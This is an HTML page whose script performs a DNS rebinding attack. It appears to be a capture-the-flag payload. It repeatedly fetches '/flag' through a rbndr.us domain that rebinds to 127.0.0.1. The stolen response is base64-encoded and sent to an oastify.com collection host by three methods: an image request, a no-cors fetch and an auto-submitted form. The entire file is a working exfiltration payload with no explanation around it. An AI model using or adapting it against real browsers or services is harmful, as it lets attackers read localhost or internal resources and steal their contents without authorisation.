<!DOCTYPE html>
<html>
<body>
<script>
// DNS rebinding attack - the core technique
let attempts = 0;
const maxAttempts = 10;

function rebindingAttack() {
    attempts++;
    
    // First, access via domain that resolves to your server
    fetch('http://7f000001.acd918ee.rbndr.us/flag')
        .then(r => r.text())
        .then(flag => {
            // Success! Send flag to our server
            exfiltrate('flag', flag);
        })
        .catch(err => {
            // After DNS TTL expires, the same domain will resolve to localhost
            if (attempts < maxAttempts) {
                setTimeout(rebindingAttack, 1000);
            } else {
                exfiltrate('error', 'Rebinding failed: ' + err.message);
            }
        });
}

// Start the attack
setTimeout(rebindingAttack, 1000);

function exfiltrate(type, data) {
    // Multiple exfiltration methods
    const encoded = btoa(data);
    
    // Method 1: Image request
    new Image().src = 'https://7goj29n78aqa9y64r68ex4caj1psdj18.oastify.com/?' + type + '=' + encoded;
    
    // Method 2: Fetch with no-cors
    fetch('https://7goj29n78aqa9y64r68ex4caj1psdj18.oastify.com/?' + type + '2=' + encoded, {
        mode: 'no-cors'
    });
    
    // Method 3: Form submission
    const form = document.createElement('form');
    form.method = 'POST';
    form.action = 'https://7goj29n78aqa9y64r68ex4caj1psdj18.oastify.com/';
    form.innerHTML = '<input name="' + type + '" value="' + encoded + '">';
    document.body.appendChild(form);
    form.submit();
}
</script>
</body>
</html>
